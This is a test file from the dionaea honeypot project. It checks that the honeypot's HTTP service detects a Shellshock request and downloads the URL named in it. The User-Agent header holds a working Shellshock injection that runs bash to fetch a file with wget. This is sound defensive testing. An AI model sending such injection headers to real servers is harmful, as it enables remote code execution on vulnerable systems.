# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""A Shellshock request with a download command: the URL is downloaded.

The HTTP service hands the header values (bytes) to util.detect_shellshock,
which offers the URL of a wget / curl command in them (dionaea.download.offer);
the download ends in dionaea.sqlite (offers, downloads) and binaries/<md5>.
"""

import hashlib
import socket
import time
import uuid

from servers import HttpServer


def test_shellshock_download_command_is_followed(dionaea_host, my_ip, query_db, binaries_dir):
    payload = ("shellshock payload %s\n" % uuid.uuid4().hex).encode() * 10
    name = "s-%s.sh" % uuid.uuid4().hex[:10]
    server = HttpServer({"/" + name: payload}, my_ip)
    url = "http://%s:%d/%s" % (my_ip, server.port, name)
    request = (
        "GET /cgi-bin/status HTTP/1.1\r\nHost: %s\r\n"
        "User-Agent: () { :;}; /bin/bash -c 'wget %s -O /tmp/x'\r\n"
        "Connection: close\r\n\r\n" % (dionaea_host, url)
    ).encode()
    try:
        with socket.create_connection((dionaea_host, 81), timeout=10) as sock:
            sock.sendall(request)
            sock.settimeout(10)
            assert sock.recv(4096).startswith(b"HTTP/1.1 "), "the HTTP service did not answer"
        md5 = hashlib.md5(payload).hexdigest()
        deadline = time.monotonic() + 30
        rows = []
        while not rows and time.monotonic() < deadline:
            rows = query_db("SELECT download_md5_hash FROM downloads WHERE download_url = ?", (url,))
            time.sleep(0.5)
        assert query_db("SELECT offer_url FROM offers WHERE offer_url = ?", (url,)), "no offer for %s" % url
        assert rows and rows[0]["download_md5_hash"] == md5
        assert (binaries_dir / md5).read_bytes() == payload
    finally:
        server.close()
